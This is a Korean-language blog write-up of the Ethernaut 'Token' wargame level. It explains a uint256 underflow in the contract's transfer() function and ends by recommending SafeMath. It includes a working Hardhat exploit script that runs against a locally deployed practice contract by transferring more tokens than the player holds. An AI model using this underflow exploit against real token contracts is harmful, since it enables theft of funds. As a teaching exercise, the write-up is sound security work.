+++
title = "Token"
date = "2023-08-22"
+++


---

> My Solutions: [github](https://github.com/c0np4nn4/EtherStudy/tree/main/ethernaut_solution)

---

# TL;DR
> ***Under/Overflow*** 문제입니다.

<center>
<img alt="main image" src="https://images.unsplash.com/photo-1568054491179-fbc8c8d40c8c?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1470&q=80" />
</center>

---

# Introduction
프로그램 상에서 연산을 할 때 [Integer Under/Overflow](https://en.wikipedia.org/wiki/Integer_overflow)는 잘 알려진 산술 에러입니다.
[Solidity](https://soliditylang.org/)언어에서도 이 에러는 여전히 존재합니다.
`Token` 컨트랙트는 이러한 문제점을 잘 보여줍니다.

---

# Problem Detail
## Goal
문제 목표를 확인하기 위해 `TokenFactory` 컨트랙트의 `validateInstance()` 함수를 살펴보면 아래와 같습니다.

<center>
<img alt="validateInstance" src="../../ethernaut_img/5_token_1.png" />
</center>

`playerSupply`는 `Token`컨트랙트가 배포 될 때, `msg.sender`에게 부여되는 초기값입니다.
즉, `player`가 처음에 받은 값보다 더 많은 값을 갖게 되면 성공합니다.

## Contract
스마트 컨트랙트를 살펴보면 아래와 같습니다.

<center>
<img alt="validateInstance" src="../../ethernaut_img/5_token_2.png" />
</center>

함수 `transfer()`를 자세히 보면, mapping `balances`에 연산을 할 때 문제가 생길 수 있음을 알 수 있습니다.

---

# Exploit
본격적으로 `exploit`을 진행하기 전에 `uint == uint256`에 관해 짧게 짚고 넘어가겠습니다.
`uint256`은 `256-bit`크기의 정보를 *unsigned integer* 로 표현하는 자료형입니다.
따라서, 아래와 같이 `최솟값`과 `최댓값`을 가짐을 알 수 있습니다.
> `최소값`: $0$
> 
> `최대값`: $2^{256} - 1 \approx 1.15792 \times 10^{79}$

## Strategy
초기 값은 `balances[player] == 20` 이므로, `value == 21`로 하여 ***Underflow*** 를 일으켜서 문제를 해결할 수 있습니다.

## Code
아래는 `Hardhat`을 이용하여 실행한 `token.js` 입니다.
코드 실행 환경은 [레포](https://github.com/c0np4nn4/etherstudy)를 확인해주시기 바랍니다.

```js
const { ethers } = require('hardhat');

async function main() {
  const [owner, player] = await ethers.getSigners();

  console.log("\n[0] original owner: ", owner.address);
  console.log("[0] player: ", player.address);

  console.log("\n[1] deploy TokenFactory");
  const Factory = await ethers.getContractFactory("TokenFactory");
  const factory = await Factory.connect(owner).deploy();
  await factory.deployed();
  console.log("---- TokenFactory address: ", factory.address);

  console.log("\n[2] create a Token instance");
  const receipt = await factory.connect(player).createInstance(player.address);
  const instance_address = (await receipt.wait()).events[0].args[0];
  const token = await ethers.getContractAt("Token", instance_address, owner);
  console.log("---- factory balance:   ", (await token.balanceOf(factory.address)).toString());
  console.log("---- owner balance:     ", (await token.balanceOf(owner.address)).toString());
  console.log("---- player balance:    ", (await token.balanceOf(player.address)).toString());

  console.log("\n[3] invoke Underflow");
  await token.connect(player).transfer(owner.address, 21);
  console.log("---- factory balance:   ", (await token.balanceOf(factory.address)).toString());
  console.log("---- owner balance:     ", (await token.balanceOf(owner.address)).toString());
  console.log("---- player balance:    ", (await token.balanceOf(player.address)).toString());

  console.log("\n[4] validate solved");
  const res = await factory.validateInstance(token.address, player.address);

  if ((await res.wait()).events[0].args[0] == true) {
    console.log("[+] Done!");
  } else {
    console.log("[+] Fail...");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});


```

## Result
실행 화면은 아래와 같습니다.

<center>
<img alt="result" src="../../ethernaut_img/5_token_3.png" />
</center>

`player` 는 초기에 `20`만큼의 토큰을 갖고 있었고, `transfer()`함수를 이용해 `21`만큼의 토큰을 `owenr`에게 보내고자 했습니다.
***Underflow*** 가 발생하 여`require()` 문에 의한 검증도 우회하게 되었으며, `player`가 `uint`의 최대값을 가짐으로써 손쉽게 문제를 해결했습니다.

---

# Conclusion
`Solidity` 상에서 연산을 하는 경우, 충분히 주의를 기울이지 않는다면 위와 같은 에러가 발생할 수 있습니다.
***Under/Overflow*** 와 같은 arithmetic error에 대응할 수 있도록, `ethernaut`을 제작한 `openzepplin`에서 [SafeMath](https://github.com/ConsenSysMesh/openzeppelin-solidity/blob/master/contracts/math/SafeMath.sol)라는 모듈을 제공하기도 합니다.
따라서 이러한 모듈을 적극적으로 활용하는 것이 도움이 될 수 있습니다.

<script src="https://utteranc.es/client.js"
        repo="c0np4nn4/utterance_repo"
        issue-term="pathname"
        label="utterances"
        theme="github-light"
        crossorigin="anonymous"
        async>
</script>
